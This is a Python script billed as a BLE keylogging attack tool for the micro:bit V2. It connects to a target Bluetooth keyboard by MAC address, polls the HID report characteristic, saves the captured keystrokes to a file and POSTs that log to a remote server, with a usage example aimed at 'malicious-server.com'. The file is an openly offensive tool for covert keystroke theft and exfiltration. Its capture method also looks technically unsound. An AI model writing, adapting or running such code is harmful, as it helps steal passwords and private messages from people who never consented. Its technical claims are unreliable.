# microbit_ble_keylogger.py

"""
BLE Keylogging Attack for micro:bit V2 (Multi-Device Support)

This script captures keystrokes from BLE keyboards and transmits the data for logging.
- Detects available micro:bit devices and assigns tasks dynamically
- Captures BLE HID keystrokes (`--log <target_mac>`)
- Sends logged keystrokes to a remote system (`--exfiltrate <log_file> <server_url>`)
- Runs all tasks sequentially if only one device is available

### Usage Examples:

1. Log keystrokes from a BLE keyboard:
   ```sh
   python microbit_ble_keylogger.py --log AA:BB:CC:DD:EE:FF
   ```

2. Exfiltrate captured keystrokes to a remote server:
   ```sh
   python microbit_ble_keylogger.py --exfiltrate keylog.txt http://malicious-server.com/upload
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
import requests
from bleak import BleakScanner, BleakClient
import argparse

# Detect Connected Micro:bit Devices
async def detect_microbits():
    """Scans for connected micro:bit devices and returns their count."""
    devices = await BleakScanner.discover()
    microbits = [device.address for device in devices if "micro:bit" in (device.name or "").lower()]
    print(f"[+] Detected {len(microbits)} micro:bit devices.")
    return microbits

# BLE Keylogging
async def ble_keylogger(target_mac, log_file):
    """Logs keystrokes from a BLE keyboard and saves them to a file."""
    print(f"[+] Starting BLE keylogger on {target_mac}...")
    async with BleakClient(target_mac) as client:
        with open(log_file, "w") as f:
            while True:
                try:
                    data = await client.read_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb")
                    f.write(data.decode() + "\n")
                    print(f"[+] Keystroke logged: {data.decode()}")
                except Exception as e:
                    print(f"[-] Error logging keystroke: {e}")
                await asyncio.sleep(0.1)

# Exfiltrate Logged Keystrokes
def exfiltrate_log(log_file, server_url):
    """Sends logged keystrokes to a remote server."""
    print(f"[+] Exfiltrating keystrokes from {log_file} to {server_url}...")
    try:
        with open(log_file, "r") as f:
            data = f.read()
        response = requests.post(server_url, data={"keystrokes": data})
        print(f"[+] Exfiltration response: {response.text}")
    except Exception as e:
        print(f"[-] Exfiltration failed: {e}")

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Keylogging Attack for micro:bit V2")
    parser.add_argument("--log", metavar="target_mac", help="Log keystrokes from a BLE keyboard")
    parser.add_argument("--exfiltrate", nargs=2, metavar=("log_file", "server_url"), help="Exfiltrate logged keystrokes to a remote server")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    microbits = loop.run_until_complete(detect_microbits())
    num_microbits = len(microbits)
    
    if args.log:
        loop.run_until_complete(ble_keylogger(args.log, "keylog.txt"))
    elif args.exfiltrate:
        exfiltrate_log(args.exfiltrate[0], args.exfiltrate[1])
